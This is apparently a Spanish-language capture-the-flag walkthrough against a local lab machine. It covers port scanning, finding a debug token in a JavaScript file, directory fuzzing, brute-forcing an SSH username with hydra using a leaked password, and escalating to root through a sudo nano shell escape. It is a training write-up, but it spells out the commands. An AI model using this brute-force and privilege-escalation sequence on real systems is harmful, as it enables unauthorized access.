Fecha: 13/08/2024

Empiezo haciendo nmap, encontrando ssh en el puerto 5000, un framework de Nodejs en el 3000 y un apache en el 80, ninguno de ellos vulnerables por searchsploit.

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Visito la página y no veo nada, solo un botón que, aparentemente, no funciona. Inspeccionando la página, veo un script, `authentication.js`, en el que dice: 
```
function autenticate() {
    console.log("Para opciones de depuracion, el token de /recurso/ es tokentraviesito");
}
```

Accedo a http://172.17.0.2/recurso/?token=tokentraviesito, y veo lo siguiente:

![](Imágenes/Pasted%20image%2020240813172916.png)

No sé qué hacer con esto, por lo que paso a hacer fuzzing de la página (con -d 2 evito demasiados niveles de recursión, ya que dentro de backend hay muchos archivos): 

```
feroxbuster -u http://172.17.0.2 -x php -x html -x txt -x js -w /usr/share/wordlists/directory-list-2.3-medium.txt -o fuzzing --threads 300 -d 2 
```

![](Imágenes/Pasted%20image%2020240813173703.png)

Mirando http://172.17.0.2/backend/server.js encuentro: 

![](Imágenes/Pasted%20image%2020240813173838.png)

Uso hydra para buscar un username que se corresponda a esa contraseña para entrar por ssh. Como se cambió el puerto al 5000: 
```
hydra -L /usr/share/wordlists/rockyou.txt  -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000 -t 64
```

Encuentro el usuario `lovely`: 
![](Imágenes/Pasted%20image%2020240813175722.png)

Con sudo -l veo que puedo ejecutar nano como superusuario, por lo que haciendo lo siguiente (https://gtfobins.github.io/gtfobins/nano/#sudo) me convierto en root:

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![](Imágenes/Pasted%20image%2020240813175932.png)
